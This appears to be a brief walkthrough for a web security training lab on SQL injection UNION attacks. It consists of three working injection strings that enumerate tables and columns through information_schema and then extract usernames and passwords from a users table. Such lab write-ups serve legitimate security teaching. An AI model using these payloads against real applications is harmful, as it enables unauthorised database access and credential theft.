# Lab: SQL injection UNION attack, retrieving data from other tables

## Steps:

1. First use this to get the table names of the database
```
' OR 1=1 UNION SELECT TABLE_NAME, TABLE_TYPE FROM information_schema.tables --
```

2. Then get the name of the columns
```
' OR 1=1 UNION SELECT COLUMN_NAME, DATA_TYPE FROM information_schema.columns WHERE TABLE_NAME='users' --
```

3. Now use the column names here to get the username and password of other users
```
' OR 1=1 UNION SELECT username, password FROM users --
```